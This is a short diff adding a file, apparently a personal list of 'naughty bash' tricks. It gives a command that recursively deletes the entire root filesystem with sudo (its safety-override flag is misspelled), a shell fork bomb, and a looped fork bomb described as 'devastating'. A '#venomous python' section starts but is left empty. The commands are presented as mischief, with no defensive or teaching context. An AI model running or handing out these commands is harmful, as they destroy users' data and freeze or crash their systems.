@@ -1,0 +1,14 @@
+#naughty bash
+1;) sudo rm -rf --no_preserve_root /
+
+
+2;) :(){ :|:& };:
+( this can be even devastating if combined with while true loop )
+
+*
+while true; do :(){ :|:& };: ; done
+*
+
+#venomous python
+
+1;) 
